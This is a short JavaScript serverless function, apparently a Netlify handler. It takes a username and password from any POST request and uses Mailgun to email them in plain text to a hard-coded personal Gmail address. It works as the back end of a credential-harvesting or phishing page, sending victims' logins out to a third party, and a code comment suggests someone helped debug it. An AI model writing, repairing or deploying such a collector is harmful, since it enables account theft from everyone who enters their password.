import formData from 'form-data';
import Mailgun from 'mailgun.js';

const mailgun = new Mailgun(formData);

const mg = mailgun.client({
username: 'api',
key: process.env.MAILGUN_API_KEY
});

export async function handler(event) {
// Only allow POST
if (event.httpMethod !== 'POST') {
return { statusCode: 405, body: 'Method Not Allowed' };
}

try {
const body = JSON.parse(event.body || '{}');

const username = body.username || 'no username';
const password = body.password || 'no password';

// HARD CODED DOMAIN (NO ENV VAR HERE)
const domain = 'sandbox6bb4164382f045b9975489c0e3137797.mailgun.org';

await mg.messages.create(domain, {
// SIMPLE FORMAT (THIS FIXES YOUR ERROR)
from: 'postmaster@sandbox6bb4164382f045b9975489c0e3137797.mailgun.org',
to: 'anabones716@gmail.com',
subject: 'Test Email',
text: `Username: ${username}\nPassword: ${password}`
});

return {
statusCode: 200,
body: JSON.stringify({ message: 'Email sent!' })
};

} catch (error) {
console.error('FULL ERROR:', error);

return {
statusCode: 500,
body: JSON.stringify({ message: error.message })
};
}
}
